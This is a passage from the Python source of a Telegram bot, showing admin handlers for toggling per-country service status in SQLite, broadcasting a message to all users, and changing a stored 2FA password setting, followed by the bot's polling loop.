        bot.reply_to(message, f"❌ Configuration Error: {e}")
    finally:
        if message.chat.id in user_data: 
            del user_data[message.chat.id]

def admin_process_toggle_status(message):
    try:
        country_name = message.text.strip(); country_code = get_country_code_from_name(country_name)
        if not country_code: 
            bot.reply_to(message, f"❌ Country not recognized: {country_name}")
            return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        current_status_tuple = cursor.execute("SELECT status FROM country_rates WHERE country_code = ?", (country_code,)).fetchone()
        if not current_status_tuple: 
            bot.reply_to(message, f"❌ {country_name} not found in database."); conn.close(); return
        current_status = current_status_tuple[0]
        new_status = "off" if current_status == "on" else "on"
        cursor.execute("UPDATE country_rates SET status = ? WHERE country_code = ?", (new_status, country_code)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Service status for {country_name} updated to {new_status.upper()}.")
    except Exception as e: 
        bot.reply_to(message, f"❌ Configuration Error: {e}")
    finally:
        if message.chat.id in user_data: 
            del user_data[message.chat.id]

def admin_process_broadcast(message):
    bot.send_message(message.chat.id, "⏳ Initiating broadcast to all users...")
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    users = cursor.execute("SELECT user_id FROM users").fetchall(); conn.close()
    success, fail = 0, 0
    for user in users:
        try:
            bot.copy_message(user[0], message.chat.id, message.message_id); success += 1
        except: 
            fail += 1
        time.sleep(0.05)
    report = f"📣 **Broadcast Completion Report**\n✅ Successfully Sent: {success}\n❌ Failed Deliveries: {fail}"
    bot.send_message(message.chat.id, report)
    if message.chat.id in user_data: 
        del user_data[message.chat.id]

def admin_process_change_2fa_password(message):
    new_password = message.text.strip()
    if not new_password:
        bot.reply_to(message, "❌ Invalid password format. Please provide a valid password.")
        return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_password', ?)", (new_password,))
    conn.commit()
    conn.close()
    bot.reply_to(message, f"✅ 2FA password successfully updated to: `{new_password}`", parse_mode="Markdown")
    if message.chat.id in user_data: 
        del user_data[message.chat.id]

# Start the bot with enhanced error handling
if __name__ == "__main__":
    logging.info("Starting Telegram Bot...")
    if check_bot_permissions():
        logging.info("Bot permissions verified successfully!")
    else:
        logging.warning("Some bot permissions issues detected. Bot may not function properly.")
    
    while True:
        try:
            logging.info("Bot is now running and polling...")
            bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except requests.exceptions.ConnectionError as e:
            logging.error(f"Connection error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Unexpected error: {e}. Retrying in 5 seconds...")
            time.sleep(5)